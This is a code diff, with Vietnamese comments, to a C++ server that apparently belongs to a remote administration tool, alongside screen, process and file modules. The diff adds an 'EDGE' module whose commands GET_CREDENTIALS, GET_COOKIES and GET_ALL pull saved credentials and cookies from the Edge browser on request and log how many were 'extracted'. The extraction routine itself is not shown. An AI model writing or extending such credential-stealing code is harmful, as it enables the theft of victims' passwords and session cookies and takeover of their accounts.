@@ -37,6 +37,7 @@
 #include "modules/ScreenManager.hpp" 
 #include "modules/ProcessManager.hpp"
 #include "modules/FileManager.hpp"
+#include "modules/EdgeManager.hpp" // THÊM DÒNG NÀY
 
 #include <boost/beast/http.hpp>
 #include <chrono>
@@ -247,6 +248,29 @@ void do_session(tcp::socket s) {
                     } else {
                         // Lệnh LIST xử lý qua Dispatcher (trả về JSON)
                         response = g_dispatcher.dispatch(request);
+                    }
+                }
+                // --- [MỚI] MODULE: EDGE MANAGER ---
+                else if (module == "EDGE") {
+                    // Edge Manager xử lý qua Dispatcher
+                    response = g_dispatcher.dispatch(request);
+                    
+                    // Log thông tin trích xuất
+                    if (cmd == "GET_CREDENTIALS" && response.contains("count")) {
+                        std::cout << "[EDGE] Extracted " << response["count"].get<int>() << " credentials\n";
+                    }
+                    else if (cmd == "GET_COOKIES" && response.contains("count")) {
+                        std::cout << "[EDGE] Extracted " << response["count"].get<int>() << " cookies\n";
+                    }
+                    else if (cmd == "GET_ALL") {
+                        int credCount = 0, cookieCount = 0;
+                        if (response.contains("credentials") && response["credentials"].contains("count")) {
+                            credCount = response["credentials"]["count"].get<int>();
+                        }
+                        if (response.contains("cookies") && response["cookies"].contains("count")) {
+                            cookieCount = response["cookies"]["count"].get<int>();
+                        }
+                        std::cout << "[EDGE] Extracted " << credCount << " credentials and " << cookieCount << " cookies\n";
                     }
                 }
                 // --- OTHER MODULES ---
